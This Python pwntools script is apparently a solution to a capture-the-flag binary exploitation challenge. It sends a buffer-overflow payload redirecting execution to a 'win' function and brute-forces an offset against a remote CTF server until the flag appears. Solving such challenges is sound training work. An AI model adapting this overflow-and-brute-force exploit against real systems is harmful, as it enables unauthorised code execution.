#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe
gdb_script = '''
    b *vuln+65
    b *main
    c
'''

def conn(argv = ''):
    if args.LOCAL:
        r = process([exe.path, argv.decode('latin-1')])
        #gdb.attach(r, gdb_script)

    else:
        r = remote("adpwn.hackini25.shellmates.club", 1402, ssl=True)

    return r

def attempt_offset(offset):
    try:            
        log.info(f"Trying with offset {offset}")
        r = conn()

        payload = b"A"*4 + p32(exe.sym.win) + b"A"*112 + p32(offset)
        r.sendline(payload)

        response = r.recvall(timeout=2)
        print(response)
        r.close()
        
        if b'shellmates' in response:
            print(f'Found at offset: {offset} (hex: {hex(offset)})')
            print('Response:')
            print(response.decode(errors='replace'))
            return True
    except:
        pass
    return False


def main():

    # where there is a way to bruteforce, dont look back x)

    offset = 0
    while True:
        if attempt_offset(offset):
            break
        else: offset += 1
        if offset == 100 : offset = 0


if __name__ == "__main__":
    main()
